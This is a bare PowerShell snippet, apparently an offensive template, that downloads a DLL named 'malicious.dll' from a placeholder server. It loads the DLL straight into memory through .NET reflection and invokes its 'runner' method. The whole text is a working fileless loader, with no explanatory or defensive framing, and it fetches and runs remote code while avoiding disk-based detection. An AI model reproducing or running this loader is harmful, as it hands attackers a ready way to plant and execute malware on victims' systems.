$data = (New-Object System.Net.WebClient).DownloadData('http://your_server/malicious.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("MaliciousLibrary.MaliciousClass")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
